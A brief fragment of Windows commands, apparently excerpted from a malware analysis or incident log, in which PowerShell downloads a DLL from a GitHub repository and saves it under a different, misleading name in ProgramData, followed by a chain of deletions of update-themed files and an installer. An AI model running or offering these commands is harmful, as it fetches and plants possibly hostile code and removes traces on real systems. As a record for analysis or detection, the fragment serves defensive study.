...
powershell.exe iwr https://github.com/wazgame/waz/raw/main/d3dcompiler_47.dll -OutFile C:\ProgramData\Packag\utshellext.dll
...
del /S /Q C:\ProgramData\AutoUpdate.xml && del /S /Q C:\ProgramData\DirectUpdate.xml && del /S /Q C:\ProgramData\UpdateDirect.xml && del /S /Q C:\ProgramData\VC_redist.x86.exe
